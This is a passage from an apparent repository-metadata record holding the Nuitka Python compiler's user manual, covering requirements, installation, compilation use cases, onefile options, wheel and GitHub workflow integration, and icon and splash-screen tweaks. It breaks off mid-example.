            "obsolete_information",
            "question",
            "stream",
            "unsupported",
            "wontfix",
            "z_historic_gsoc2019"
        ],
        "README_content": ".. image:: https://img.shields.io/pypi/pyversions/Nuitka.svg\n   :target: https://pypi.org/project/Nuitka\n\n.. image:: https://badge.fury.io/py/Nuitka.svg\n   :target: https://pypi.org/project/Nuitka\n\n.. image:: https://img.shields.io/badge/Contributor%20Covenant-v1.4%20adopted-ff69b4.svg\n   :target: CODE_OF_CONDUCT.md\n\n####################\n Nuitka User Manual\n####################\n\nThis document is the recommended first read when you start using\n**Nuitka**. On this page, you will learn more about **Nuitka**\nfundamentals, such as license type, use cases, requirements, and\ncredits.\n\n.. contents:: Table of Contents\n   :depth: 1\n   :local:\n   :class: page-toc\n\nNuitka is **the** Python compiler. It is written in Python. It is a\nseamless replacement or extension to the Python interpreter and compiles\n**every** construct that Python 2 (2.6, 2.7) and Python 3 (3.4 - 3.13)\nhave, when itself run with that Python version.\n\nIt then executes uncompiled code and compiled code together in an\nextremely compatible manner.\n\nYou can use all Python library modules and all extension modules freely.\n\nNuitka translates the Python modules into a C level program that then\nuses ``libpython`` and static C files of its own to execute in the same\nway as CPython does.\n\nAll optimization is aimed at avoiding overhead, where it's unnecessary.\nNone is aimed at removing compatibility, although slight improvements\nwill occasionally be done, where not every bug of standard Python is\nemulated, e.g. more complete error messages are given, but there is a\nfull compatibility mode to disable even that.\n\n**************\n Requirements\n**************\n\nTo ensure smooth operation of **Nuitka**, make sure to follow system\nrequirements, that include the following components:\n\n.. contents::\n   :depth: 1\n   :local:\n\nC Compiler\n==========\n\nYou need a C compiler with support for C11 or alternatively a C++\ncompiler for C++03 [#]_.\n\nCurrently, this means, you need to use one of these compilers:\n\n-  The MinGW64 C11 compiler, on Windows, must be based on gcc 11.2 or\n   higher. It will be *automatically* downloaded if no usable C compiler\n   is found, which is the recommended way of installing it, as Nuitka\n   will also upgrade it for you.\n\n-  Visual Studio 2022 or higher on Windows [#]_. English language pack\n   for best results (Nuitka filters away garbage outputs, but only for\n   English language). It will be used by default if installed.\n\n-  On all other platforms, the ``gcc`` compiler of at least version 5.1,\n   and below that the ``g++`` compiler of at least version 4.4 as an\n   alternative.\n\n-  The ``clang`` compiler on macOS X and most FreeBSD architectures.\n\n-  On Windows, the ``clang-cl`` compiler on Windows can be used if\n   provided by the Visual Studio installer.\n\n.. [#]\n\n   Support for this C11 is given with gcc 5.x or higher or any clang\n   version.\n\n   The older MSVC compilers don't do it yet. But as a workaround, with\n   Python 3.10 or older, the C++03 language standard is significantly\n   overlapping with C11, it is then used instead.\n\n.. [#]\n\n   Download for free from\n   https://www.visualstudio.com/en-us/downloads/download-visual-studio-vs.aspx\n   (the community editions work just fine).\n\n   The latest version is recommended, but not required. On the other hand,\n   there is no need to except to support pre-Windows 10 versions, and they\n   might work for you, but support of these configurations is only\n   available to commercial users.\n\nPython\n======\n\n**Python 2** (2.6, 2.7) and **Python 3** (3.4 — 3.13) are supported. If\nat any moment, there is a stable Python release that is not in this\nlist, rest assured it is being worked on and will be added.\n\n.. important::\n\n   For Python 3.4 and *only* that version, we need other Python version\n   as a *compile time* dependency.\n\n   Nuitka itself is fully compatible with all listed versions, but Scons\n   as an internally used tool is not.\n\n   For these versions, you *need* a Python2 or Python 3.5 or higher\n   installed as well, but only during the compile time. That is for use\n   with Scons (which orchestrates the C compilation), which does not\n   support the same Python versions as Nuitka.\n\n   In addition, on Windows, Python2 cannot be used because ``clcache``\n   does not work with it, there a Python 3.5 or higher needs to be\n   installed.\n\n   Nuitka finds these needed Python versions (e.g. on Windows via\n   registry) and you shouldn't notice it as long as they are installed.\n\n   Increasingly, other functionality is available when another Python\n   has a certain package installed. For example, onefile compression\n   will work for a Python 2.x when another Python is found that has the\n   ``zstandard`` package installed.\n\n.. admonition:: Moving binaries to other machines\n\n   The created binaries can be made executable independent of the Python\n   installation, with ``--standalone`` and ``--onefile`` options.\n\n.. admonition:: Binary filename suffix\n\n   The created binaries have an ``.exe`` suffix on Windows. On other\n   platforms they have no suffix for standalone mode, or ``.bin``\n   suffix, that you are free to remove or change, or specify with the\n   ``-o`` option.\n\n   The suffix for acceleration mode is added just to be sure that the\n   original script name and the binary name do not ever collide, so we\n   can safely overwrite the binary without destroying the original\n   source file.\n\n.. admonition:: It **has to** be CPython, Anaconda Python, or Homebrew\n\n   You need the standard Python implementation, called \"CPython\", to\n   execute Nuitka because it is closely tied to implementation details\n   of it.\n\n.. admonition:: It **cannot be** from the Windows app store\n\n   It is known that Windows app store Python definitely does not work,\n   it's checked against.\n\n.. admonition:: It **cannot be** pyenv on macOS\n\n   It is known that macOS \"pyenv\" does **not** work. Use Homebrew\n   instead for self compiled Python installations. But note that\n   standalone mode will be worse on these platforms and not be as\n   backward compatible with older macOS versions.\n\nOperating System\n================\n\nSupported Operating Systems: Linux, FreeBSD, NetBSD, macOS, and Windows\n(32 bits/64 bits/ARM).\n\nOthers will work as well. The portability is expected to be generally\ngood, but the e.g. Nuitka's internal Scons usage may have to be adapted\nor need flags passed. Make sure to match Python and C compiler\narchitecture, or else you will get cryptic error messages.\n\nArchitecture\n============\n\nSupported Architectures are x86, x86_64 (amd64), and arm, likely many,\nmany more.\n\nOther architectures are expected to also work, out of the box, as Nuitka\nis generally not using any hardware specifics. These are just the ones\ntested and known to be good. Feedback is welcome. Generally, the\narchitectures that Debian supports can be considered good and tested,\ntoo.\n\n*******\n Usage\n*******\n\nCommand Line\n============\n\nThe recommended way of executing Nuitka is ``<the_right_python> -m\nnuitka`` to be absolutely certain which Python interpreter you are\nusing, so it is easier to match with what Nuitka has.\n\nThe next best way of executing Nuitka bare that is from a source\ncheckout or archive, with no environment variable changes, most\nnoteworthy, you do not have to mess with ``PYTHONPATH`` at all for\nNuitka. You just execute the ``nuitka`` and ``nuitka-run`` scripts\ndirectly without any changes to the environment. You may want to add the\n``bin`` directory to your ``PATH`` for your convenience, but that step\nis optional.\n\nMoreover, if you want to execute with the right interpreter, in that\ncase, be sure to execute ``<the_right_python> bin/nuitka`` and be good.\n\n.. admonition:: Pick the right Interpreter\n\n   If you encounter a ``SyntaxError`` you absolutely most certainly have\n   picked the wrong interpreter for the program you are compiling.\n\nNuitka has a ``--help`` option to output what it can do:\n\n.. code:: bash\n\n   nuitka --help\n\nThe ``nuitka-run`` command is the same as ``nuitka``, but with a\ndifferent default. It tries to compile *and* directly execute a Python\nscript:\n\n.. code:: bash\n\n   nuitka-run --help\n\nThis option that is different is ``--run``, and passing on arguments\nafter the first non-option to the created binary, so it is somewhat more\nsimilar to what plain ``python`` will do.\n\nInstallation\n============\n\nFor most systems, there will be packages on the `download page\n<https://nuitka.net/doc/download.html>`__ of Nuitka. But you can also\ninstall it from source code as described above, but also like any other\nPython program it can be installed via the normal ``python setup.py\ninstall`` routine.\n\nNotice for integration with GitHub workflows there is this\n`Nuitka-Action <https://github.com/Nuitka/Nuitka-Action>`__ that you\nshould use that makes it really easy to integrate. You ought to start\nwith a local compilation though, but this will be easiest for cross\nplatform compilation with Nuitka.\n\nLicense\n=======\n\nNuitka is licensed under the Apache License, Version 2.0; you may not\nuse it except in compliance with the License.\n\nYou may obtain a copy of the License at\nhttp://www.apache.org/licenses/LICENSE-2.0\n\nUnless required by applicable law or agreed to in writing, software\ndistributed under the License is distributed on an \"AS IS\" BASIS,\nWITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\nSee the License for the specific language governing permissions and\nlimitations under the License.\n\n*************************************\n Tutorial Setup and build on Windows\n*************************************\n\nThis is basic steps if you have nothing installed, of course if you have\nany of the parts, just skip it.\n\nSetup\n=====\n\nInstall Python\n--------------\n\n-  Download and install Python from\n   https://www.python.org/downloads/windows\n\n-  Select one of ``Windows x86-64 web-based installer`` (64 bits Python,\n   recommended) or ``x86 executable`` (32 bits Python) installer.\n\n-  Verify it's working using command ``python --version``.\n\nInstall Nuitka\n--------------\n\n-  ``python -m pip install nuitka``\n\n-  Verify using command ``python -m nuitka --version``\n\nWrite some code and test\n========================\n\nCreate a folder for the Python code\n-----------------------------------\n\n-  ``mkdir`` HelloWorld\n\n-  make a python file named **hello.py**\n\n.. code:: python\n\n   def talk(message):\n       return \"Talk \" + message\n\n\n   def main():\n       print(talk(\"Hello World\"))\n\n\n   if __name__ == \"__main__\":\n       main()\n\nTest your program\n-----------------\n\nDo as you normally would. Running Nuitka on code that works incorrectly\nis not easier to debug.\n\n.. code:: bash\n\n   python hello.py\n\n----\n\nBuild it using\n--------------\n\n.. code:: bash\n\n   python -m nuitka hello.py\n\n.. note::\n\n   This will prompt you to download a C caching tool (to speed up\n   repeated compilation of generated C code) and a MinGW64 based C\n   compiler, unless you have a suitable MSVC installed. Say ``yes`` to\n   both those questions.\n\nRun it\n------\n\nExecute the ``hello.exe`` created near ``hello.py``.\n\nDistribute\n----------\n\nTo distribute, build with ``--standalone`` option, which will not output\na single executable, but a whole folder. Copy the resulting\n``hello.dist`` folder to the other machine and run it.\n\nYou may also try ``--onefile`` which does create a single file, but make\nsure that the mere standalone is working, before turning to it, as it\nwill make the debugging only harder, e.g. in case of missing data files.\n\n***********\n Use Cases\n***********\n\nUse Case 1 — Program compilation with all modules embedded\n==========================================================\n\nIf you want to compile a whole program recursively, and not only the\nsingle file that is the main program, do it like this:\n\n.. code:: bash\n\n   python -m nuitka --follow-imports program.py\n\n.. note::\n\n   There are more fine-grained controls than ``--follow-imports``\n   available. Consider the output of ``nuitka --help``. Including fewer\n   modules into the compilation, but instead using normal Python for it,\n   will make it faster to compile.\n\nIn case you have a source directory with dynamically loaded files, i.e.\none which cannot be found by recursing after normal import statements\nvia the ``PYTHONPATH`` (which would be the recommended way), you can\nalways require that a given directory shall also be included in the\nexecutable:\n\n.. code:: bash\n\n   python -m nuitka --follow-imports --include-plugin-directory=plugin_dir program.py\n\n.. note::\n\n   If you don't do any dynamic imports, simply setting your\n   ``PYTHONPATH`` at compilation time is what you should do.\n\n   Use ``--include-plugin-directory`` only if you make ``__import__()``\n   calls that Nuitka cannot predict, and that come from a directory, for\n   everything from your Python installation, use ``--include-module`` or\n   ``--include-package``.\n\n.. note::\n\n   The resulting filename will be ``program.exe`` on Windows,\n   ``program.bin`` on other platforms, but ``--output-filename`` allows\n   changing that.\n\n.. note::\n\n   The resulting binary still depends on CPython and used C extension\n   modules being installed.\n\n   If you want to be able to copy it to another machine, use\n   ``--standalone`` and copy the created ``program.dist`` directory and\n   execute the ``program.exe`` (Windows) or ``program`` (other\n   platforms) put inside.\n\nUse Case 2 — Extension Module compilation\n=========================================\n\nIf you want to compile a single extension module, all you have to do is\nthis:\n\n.. code:: bash\n\n   python -m nuitka --module some_module.py\n\nThe resulting file ``some_module.so`` can then be used instead of\n``some_module.py``.\n\n.. important::\n\n   The filename of the produced extension module must not be changed as\n   Python insists on a module name derived function as an entry point,\n   in this case ``PyInit_some_module`` and renaming the file will not\n   change that. Match the filename of the source code to what the binary\n   name should be.\n\n.. note::\n\n   If both the extension module and the source code of it are in the\n   same directory, the extension module is loaded. Changes to the source\n   code only have effect once you recompile.\n\n.. note::\n\n   The option ``--follow-import-to`` works as well, but the included\n   modules will only become importable *after* you imported the\n   ``some_module`` name. If these kinds of imports are invisible to\n   Nuitka, e.g. dynamically created, you can use ``--include-module`` or\n   ``--include-package`` in that case, but for static imports it should\n   not be needed.\n\n.. note::\n\n   An extension module can never include other extension modules. You\n   will have to create a wheel for this to be doable.\n\n.. note::\n\n   The resulting extension module can only be loaded into a CPython of\n   the same version and doesn't include other extension modules.\n\nUse Case 3 — Package compilation\n================================\n\nIf you need to compile a whole package and embed all modules, that is\nalso feasible, use Nuitka like this:\n\n.. code:: bash\n\n   python -m nuitka --module some_package --include-package=some_package\n\n.. note::\n\n   The inclusion of the package contents needs to be provided manually;\n   otherwise, the package is mostly empty. You can be more specific if\n   you like, and only include part of it, or exclude part of it, e.g.\n   with ``--nofollow-import-to='*.tests'`` you would not include the\n   unused test part of your code.\n\n.. note::\n\n   Data files located inside the package will not be embedded by this\n   process, you need to copy them yourself with this approach.\n   Alternatively, you can use the `file embedding of Nuitka commercial\n   <https://nuitka.net/doc/commercial/protect-data-files.html>`__.\n\nUse Case 4 — Program Distribution\n=================================\n\nFor distribution to other systems, there is the standalone mode, which\nproduces a folder for which you can specify ``--standalone``.\n\n.. code:: bash\n\n   python -m nuitka --standalone program.py\n\nFollowing all imports is default in this mode. You can selectively\nexclude modules by specifically saying ``--nofollow-import-to``, but\nthen an ``ImportError`` will be raised when import of it is attempted at\nprogram run time. This may cause different behavior, but it may also\nimprove your compile time if done wisely.\n\nFor data files to be included, use the option\n``--include-data-files=<source>=<target>`` where the source is a file\nsystem path, but the target has to be specified relative. For the\nstandalone mode, you can also copy them manually, but this can do extra\nchecks, and for the onefile mode, there is no manual copying possible.\n\nTo copy some or all file in a directory, use the option\n``--include-data-files=/etc/*.txt=etc/`` where you get to specify shell\npatterns for the files, and a subdirectory where to put them, indicated\nby the trailing slash.\n\n.. important::\n\n   Nuitka does not consider data files code, do not include DLLs, or\n   Python files as data files, and expect them to work, they will not,\n   unless you really know what you are doing.\n\nIn the following, non-code data files are all files, not matching on of\nthese criterions.\n\n+------------+----------------------------------------------------------------------------------------+--------------------------------------------------------------------------------------------------------+\n| Suffix     | Rationale                                                                              | Solution                                                                                               |\n+============+========================================================================================+========================================================================================================+\n| ``.py``    | Nuitka trims even the stdlib modules to be included. If it doesn't see Python code,    | Use ``--include-module`` on them instead                                                               |\n|            | there is no dependencies analyzed, and as a result it will just not work.              |                                                                                                        |\n+------------+----------------------------------------------------------------------------------------+--------------------------------------------------------------------------------------------------------+\n| ``.pyc``   | Same as ``.py``.                                                                       | Use ``--include-module`` on them from their source code instead.                                       |\n+------------+----------------------------------------------------------------------------------------+--------------------------------------------------------------------------------------------------------+\n| ``.pyo``   | Same as ``.pyc``.                                                                      | Use ``--include-module`` on them from their source code instead.                                       |\n+------------+----------------------------------------------------------------------------------------+--------------------------------------------------------------------------------------------------------+\n| ``.pyw``   | Same as ``.py``.                                                                       | For including multiple programs, use multiple ``--main`` arguments instead.                            |\n+------------+----------------------------------------------------------------------------------------+--------------------------------------------------------------------------------------------------------+\n| ``.pyi``   | These are ignored, because they are code-like and not needed at run time. For the      | Raise an issue if 3rd part software needs it.                                                          |\n|            | ``lazy`` package that actually would depend on them, we made a compile time solution   |                                                                                                        |\n|            | that removes the need.                                                                 |                                                                                                        |\n+------------+----------------------------------------------------------------------------------------+--------------------------------------------------------------------------------------------------------+\n| ``.pyx``   | These are ignored, because they are Cython source code not used at run time            |                                                                                                        |\n+------------+----------------------------------------------------------------------------------------+--------------------------------------------------------------------------------------------------------+\n| ``.dll``   | These are ignored, since they **usually** are not data files. For the cases where 3rd  | Create Nuitka Package configuration for those, with ``dll`` section for the package that uses them.    |\n|            | party packages do actually used them as data, e.g. ``.NET`` packages, we solve that in | For rare cases, data-files section with special configuration might be the correct thing to do.        |\n|            | package configuration for it.                                                          |                                                                                                        |\n+------------+----------------------------------------------------------------------------------------+--------------------------------------------------------------------------------------------------------+\n| ``.dylib`` | These are ignored, since they macOS extension modules or DLLs.                         | Need to add configuration with ``dll`` section or ``depends`` that are missing                         |\n+------------+----------------------------------------------------------------------------------------+--------------------------------------------------------------------------------------------------------+\n| ``.so``    | These are ignored, since they Linux, BSD, etc. extension modules or DLLs.              | Need to add configuration with ``dll`` section or ``depends`` that are missing                         |\n+------------+----------------------------------------------------------------------------------------+--------------------------------------------------------------------------------------------------------+\n| ``.exe``   | The are binaries to Windows.                                                           | You can add Nuitka Package configuration to include those as DLLs and mark them as ``executable: yes`` |\n+------------+----------------------------------------------------------------------------------------+--------------------------------------------------------------------------------------------------------+\n| ``.bin``   | The are binaries to non-Windows, otherwise same as ``.exe``.                           |                                                                                                        |\n+------------+----------------------------------------------------------------------------------------+--------------------------------------------------------------------------------------------------------+\n\nAlso folders are ignored, these are ``site-packages``, ``dist-packages``\nand ``vendor-packages`` which would otherwise include a full virtualenv,\nwhich is never a good thing to happen. And the ``__pycache__`` folder is\nalso always ignored. On non-MacOS the file ``.DS_Store`` is ignored too,\nand ``py.typed`` folders have only meaning to IDEs, and are ignored like\n``.pyi`` files .\n\nTo copy a whole folder with all non-code files, you can use\n``--include-data-dir=/path/to/images=images`` which will place those in\nthe destination, and if you want to use the ``--noinclude-data-files``\noption to remove them. Code files are as detailed above DLLs,\nexecutables, Python files, etc. and will be ignored. For those you can\nuse the ``--include-data-files=/binaries/*.exe=binary/`` form to force\nthem, but that is not recommended and known to cause issues at run-time.\n\nFor package data, there is a better way, namely using\n``--include-package-data``, which detects all non-code data files of\npackages automatically and copies them over. It even accepts patterns in\na shell style. It spares you the need to find the package directory\nyourself and should be preferred whenever available. Functionally it's\nvery similar to ``--include-data-dir`` but it has the benefit to locate\nthe correct folder for you.\n\nWith data files, you are largely on your own. Nuitka keeps track of ones\nthat are needed by popular packages, but it might be incomplete. Raise\nissues if you encounter something in these. Even better, raise PRs with\nenhancements to the Nuitka package configuration. With want 3rd party\nsoftware to just work out of the box.\n\nWhen that is working, you can use the onefile mode if you so desire.\n\n.. code:: bash\n\n   python -m nuitka --onefile program.py\n\nThis will create a single binary, that extracts itself on the target,\nbefore running the program. But notice, that accessing files relative to\nyour program is impacted, make sure to read the section `Onefile:\nFinding files`_ as well.\n\n.. code:: bash\n\n   # Create a binary that unpacks into a temporary folder\n   python -m nuitka --onefile program.py\n\n.. note::\n\n   There are more platform-specific options, e.g. related to icons,\n   splash screen, and version information, consider the ``--help``\n   output for the details of these and check the section Tweaks_.\n\nFor the unpacking, by default a unique user temporary path one is used,\nand then deleted, however this default\n``--onefile-tempdir-spec=\"{TEMP}/onefile_{PID}_{TIME}\"`` can be\noverridden with a path specification that is using then using a cached\npath, avoiding repeated unpacking, e.g. with\n``--onefile-tempdir-spec=\"{CACHE_DIR}/{COMPANY}/{PRODUCT}/{VERSION}\"``\nwhich uses version information, and user-specific cache directory.\n\n.. note::\n\n   Using cached paths will be relevant, e.g. when Windows Firewall comes\n   into play because otherwise, the binary will be a different one to it\n   each time it is run.\n\nCurrently, these expanded tokens are available:\n\n+----------------+-----------------------------------------------------------+---------------------------------------+\n| Token          | What this Expands to                                      | Example                               |\n+================+===========================================================+=======================================+\n| {TEMP}         | User temporary file directory                             | C:\\\\Users\\\\...\\\\AppData\\\\Locals\\\\Temp |\n+----------------+-----------------------------------------------------------+---------------------------------------+\n| {PID}          | Process ID                                                | 2772                                  |\n+----------------+-----------------------------------------------------------+---------------------------------------+\n| {TIME}         | Time in seconds since the epoch.                          | 1299852985                            |\n+----------------+-----------------------------------------------------------+---------------------------------------+\n| {PROGRAM}      | Full program run-time filename of executable.             | C:\\\\SomeWhere\\\\YourOnefile.exe        |\n+----------------+-----------------------------------------------------------+---------------------------------------+\n| {PROGRAM_BASE} | No-suffix of run-time filename of executable.             | C:\\\\SomeWhere\\\\YourOnefile            |\n+----------------+-----------------------------------------------------------+---------------------------------------+\n| {CACHE_DIR}    | Cache directory for the user.                             | C:\\\\Users\\\\SomeBody\\\\AppData\\\\Local   |\n+----------------+-----------------------------------------------------------+---------------------------------------+\n| {COMPANY}      | Value given as ``--company-name``                         | YourCompanyName                       |\n+----------------+-----------------------------------------------------------+---------------------------------------+\n| {PRODUCT}      | Value given as ``--product-name``                         | YourProductName                       |\n+----------------+-----------------------------------------------------------+---------------------------------------+\n| {VERSION}      | Combination of ``--file-version`` & ``--product-version`` | 3.0.0.0-1.0.0.0                       |\n+----------------+-----------------------------------------------------------+---------------------------------------+\n| {HOME}         | Home directory for the user.                              | /home/somebody                        |\n+----------------+-----------------------------------------------------------+---------------------------------------+\n| {NONE}         | When provided for file outputs, ``None`` is used          | see notice below                      |\n+----------------+-----------------------------------------------------------+---------------------------------------+\n| {NULL}         | When provided for file outputs, ``os.devnull`` is used    | see notice below                      |\n+----------------+-----------------------------------------------------------+---------------------------------------+\n\n.. important::\n\n   It is your responsibility to make the path provided unique, on\n   Windows a running program will be locked, and while using a fixed\n   folder name is possible, it can cause locking issues in that case,\n   where the program gets restarted.\n\n   Usually, you need to use ``{TIME}`` or at least ``{PID}`` to make a\n   path unique, and this is mainly intended for use cases, where e.g.\n   you want things to reside in a place you choose or abide your naming\n   conventions.\n\n.. important::\n\n   For disabling output and stderr with ``--force-stdout-spec`` and\n   ``--force-stderr-spec`` the values ``{NONE}`` and ``{NULL}`` achieve\n   it, but with different effect. With ``{NONE}``, the corresponding\n   handle becomes ``None``. As a result, e.g. ``sys.stdout`` will be\n   ``None``, which is different from ``{NULL}`` where it will be backed\n   by a file pointing to ``os.devnull``, i.e. you can write to it.\n\n   With ``{NONE}``, you may e.g. get ``RuntimeError: lost sys.stdout``\n   in case it does get used; with ``{NULL}`` that never happens.\n   However, some libraries handle this as input for their logging\n   mechanism, and on Windows this is how you are compatible with\n   ``pythonw.exe`` which is behaving like ``{NONE}``.\n\nUse Case 5 — Setuptools Wheels\n==============================\n\nIf you have a ``setup.py``, ``setup.cfg`` or ``pyproject.toml`` driven\ncreation of wheels for your software in place, putting Nuitka to use is\nextremely easy.\n\nLet's start with the most common ``setuptools`` approach, you can,\nhaving Nuitka installed of course, simply execute the target\n``bdist_nuitka`` rather than the ``bdist_wheel``. It takes all the\noptions and allows you to specify some more, that are specific to\nNuitka.\n\n.. code:: python\n\n   # For setup.py if you don't use other build systems:\n   setup(\n      # Data files are to be handled by setuptools and not Nuitka\n      package_data={\"some_package\": [\"some_file.txt\"]},\n      ...,\n      # This is to pass Nuitka options.\n      command_options={\n         'nuitka': {\n            # boolean option, e.g. if you cared for C compilation commands\n            '--show-scons': True,\n            # options without value, e.g. enforce using Clang\n            '--clang': None,\n            # options with single values, e.g. enable a plugin of Nuitka\n            '--enable-plugin': \"pyside2\",\n            # options with several values, e.g. avoiding including modules\n            '--nofollow-import-to' : [\"*.tests\", \"*.distutils\"],\n         },\n      },\n   )\n\n   # For setup.py with other build systems:\n   # The tuple nature of the arguments is required by the dark nature of\n   # \"setuptools\" and plugins to it, that insist on full compatibility,\n   # e.g. \"setuptools_rust\"\n\n   setup(\n      # Data files are to be handled by setuptools and not Nuitka\n      package_data={\"some_package\": [\"some_file.txt\"]},\n      ...,\n      # This is to pass Nuitka options.\n      ...,\n      command_options={\n         'nuitka': {\n            # boolean option, e.g. if you cared for C compilation commands\n            '--show-scons': (\"setup.py\", True),\n            # options without value, e.g. enforce using Clang\n            '--clang': (\"setup.py\", None),\n            # options with single values, e.g. enable a plugin of Nuitka\n            '--enable-plugin': (\"setup.py\", \"pyside2\"),\n            # options with several values, e.g. avoiding including modules\n            '--nofollow-import-to' : (\"setup.py\", [\"*.tests\", \"*.distutils\"]),\n         }\n      },\n   )\n\nIf for some reason, you cannot or do not want to change the target, you\ncan add this to your ``setup.py``.\n\n.. code:: python\n\n   # For setup.py\n   setup(\n      ...,\n      build_with_nuitka=True\n   )\n\n.. note::\n\n   To temporarily disable the compilation, you could the remove above\n   line, or edit the value to ``False`` by or take its value from an\n   environment variable if you so choose, e.g.\n   ``bool(os.getenv(\"USE_NUITKA\", \"True\"))``. This is up to you.\n\nOr you could put it in your ``setup.cfg``\n\n.. code:: toml\n\n   [metadata]\n   build_with_nuitka = true\n\nAnd last, but not least, Nuitka also supports the new ``build`` meta, so\nwhen you have a ``pyproject.toml`` already, simple replace or add this\nvalue:\n\n.. code:: toml\n\n   [build-system]\n   requires = [\"setuptools>=42\", \"wheel\", \"nuitka\", \"toml\"]\n   build-backend = \"nuitka.distutils.Build\"\n\n   # Data files are to be handled by setuptools and not Nuitka\n   [tool.setuptools.package-data]\n   some_package = ['data_file.txt']\n\n   [tool.nuitka]\n   # These are not recommended, but they make it obvious to have effect.\n\n   # boolean option, e.g. if you cared for C compilation commands, leading\n   # dashes are omitted\n   show-scons = true\n\n   # options with single values, e.g. enable a plugin of Nuitka\n   enable-plugin = \"pyside2\"\n\n   # options with several values, e.g. avoiding including modules, accepts\n   # list argument.\n   nofollow-import-to = [\"*.tests\", \"*.distutils\"]\n\n.. note::\n\n   For the ``nuitka`` requirement above absolute paths like\n   ``C:\\Users\\...\\Nuitka`` will also work on Linux, use an absolute path\n   with *two* leading slashes, e.g. ``//home/.../Nuitka``.\n\n.. note::\n\n   Whatever approach you take, data files in these wheels are not\n   handled by Nuitka at all, but by setuptools. You can, however, use\n   the data file embedding of Nuitka commercial. In that case, you\n   actually would embed the files inside the extension module itself,\n   and not as a file in the wheel.\n\nUse Case 6 — Multidist\n======================\n\nIf you have multiple programs, that each should be executable, in the\npast you had to compile multiple times, and deploy all of these. With\nstandalone mode, this, of course, meant that you were fairly wasteful,\nas sharing the folders could be done, but wasn't really supported by\nNuitka.\n\nEnter ``Multidist``. There is an option ``--main`` that replaces or adds\nto the positional argument given. And it can be given multiple times.\nWhen given multiple times, Nuitka will create a binary that contains the\ncode of all the programs given, but sharing modules used in them. They\ntherefore do not have to be distributed multiple times.\n\nLet's call the basename of the main path, and entry point. The names of\nthese must, of course, be different. Then the created binary can execute\neither entry point, and will react to what ``sys.argv[0]`` appears to\nit. So if executed in the right way (with something like ``subprocess``\nor OS API you can control this name), or by renaming or copying the\nbinary, or symlinking to it, you can then achieve the miracle.\n\nThis allows to combine very different programs into one.\n\n.. note::\n\n   This feature is still experimental. Use with care and report your\n   findings should you encounter anything that is undesirable behavior\n\nThis mode works with standalone, onefile, and mere acceleration. It does\nnot work with module mode.\n\nUse Case 7 — Building with GitHub Workflows\n===========================================\n\nFor integration with GitHub workflows there is this `Nuitka-Action\n<https://github.com/Nuitka/Nuitka-Action>`__ that you should use that\nmakes it really easy to integrate. You ought to start with a local\ncompilation though, but this will be easiest for cross platform\ncompilation with Nuitka.\n\nThis is an example workflow that builds on all 3 OSes\n\n.. code:: yaml\n\n   jobs:\n   build:\n      strategy:\n         matrix:\n         os: [macos-latest, ubuntu-latest, windows-latest]\n\n      runs-on: ${{ matrix.os }}\n\n      steps:\n         - name: Check-out repository\n         uses: actions/checkout@v4\n\n         - name: Setup Python\n         uses: actions/setup-python@v5\n         with:\n            python-version: '3.10'\n            cache: 'pip'\n            cache-dependency-path: |\n               **/requirements*.txt\n\n         - name: Install your Dependencies\n         run: |\n            pip install -r requirements.txt -r requirements-dev.txt\n\n         - name: Build Executable with Nuitka\n         uses: Nuitka/Nuitka-Action@main\n         with:\n            nuitka-version: main\n            script-name: your_main_program.py\n            # many more Nuitka options available, see action doc, but it's best\n            # to use nuitka-project: options in your code, so e.g. you can make\n            # a difference for macOS and create an app bundle there.\n            onefile: true\n\n         - name: Upload Artifacts\n         uses: actions/upload-artifact@v3\n         with:\n            name: ${{ runner.os }} Build\n            path: | # match what's created for the 3 OSes\n               build/*.exe\n               build/*.bin\n               build/*.app/**/*\n\nIf you app is a GUI, e.g. ``your_main_program.py`` should contain these\ncomments as explained in `Nuitka Options in the code`_ since on macOS\nthis should then be a bundle.\n\n.. code:: python\n\n   # Compilation mode, standalone everywhere, except on macOS there app bundle\n   # nuitka-project-if: {OS} in (\"Windows\", \"Linux\", \"FreeBSD\"):\n   #    nuitka-project: --onefile\n   # nuitka-project-if: {OS} == \"Darwin\":\n   #    nuitka-project: --standalone\n   #    nuitka-project: --macos-create-app-bundle\n   #\n\n********\n Tweaks\n********\n\nIcons\n=====\n\nFor good looks, you may specify icons. On Windows, you can provide an\nicon file, a template executable, or a PNG file. All of these will work\nand may even be combined:\n\n.. code:: bash\n\n   # These create binaries with icons on Windows\n   python -m nuitka --onefile --windows-icon-from-ico=your-icon.png program.py\n   python -m nuitka --onefile --windows-icon-from-ico=your-icon.ico program.py\n   python -m nuitka --onefile --windows-icon-template-exe=your-icon.ico program.py\n\n   # These create application bundles with icons on macOS\n   python -m nuitka --macos-create-app-bundle --macos-app-icon=your-icon.png program.py\n   python -m nuitka --macos-create-app-bundle --macos-app-icon=your-icon.icns program.py\n\n.. note::\n\n   With Nuitka, you do not have to create platform-specific icons, but\n   instead it will convert e.g. PNG, but also other formats on the fly\n   during the build.\n\nMacOS Entitlements\n==================\n\nEntitlements for an macOS application bundle can be added with the\noption, ``--macos-app-protected-resource``, all values are listed on\n`this page from Apple\n<https://developer.apple.com/documentation/bundleresources/information_property_list/protected_resources>`__\n\nAn example value would be\n``--macos-app-protected-resource=NSMicrophoneUsageDescription:Microphone\naccess`` for requesting access to a Microphone. After the colon, the\ndescriptive text is to be given.\n\n.. note::\n\n   Beware that in the likely case of using spaces in the description\n   part, you need to quote it for your shell to get through to Nuitka\n   and not be interpreted as Nuitka arguments.\n\nConsole Window\n==============\n\nOn Windows, the console is not opened by programs unless you say so.\nNuitka defaults to not show it, you can force it by using\n``--console=force`` though, then the program will open a new terminal\nWindow when its executed.\n\nSplash screen\n=============\n\nSplash screens are useful when program startup is slow. Onefile startup\nitself is not slow, but your program may be, and you cannot really know\nhow fast the computer used will be, so it might be a good idea to have\nthem. Luckily, with Nuitka, they are easy to add for Windows.\n\nFor the splash screen, you need to specify it as a PNG file, and then\nmake sure to disable the splash screen when your program is ready, e.g.\nhas completed the imports, prepared the window, connected to the\ndatabase, and wants the splash screen to go away. Here we are using the\nproject syntax to combine the code with the creation, compile this:\n\n.. code:: python\n\n   # nuitka-project: --onefile\n   # nuitka-project: --onefile-windows-splash-screen-image={MAIN_DIRECTORY}/Splash-Screen.png\n\n   # Whatever this is, obviously\n   print(\"Delaying startup by 10s...\")\n   import time, tempfile, os\n   time.sleep(10)\n\n   # Use this code to signal the splash screen removal.\n   if \"NUITKA_ONEFILE_PARENT\" in os.environ:\n      splash_filename = os.path.join(\n         tempfile.gettempdir(),\n         \"onefile_%d_splash_feedback.tmp\" % int(os.environ[\"NUITKA_ONEFILE_PARENT\"]),\n      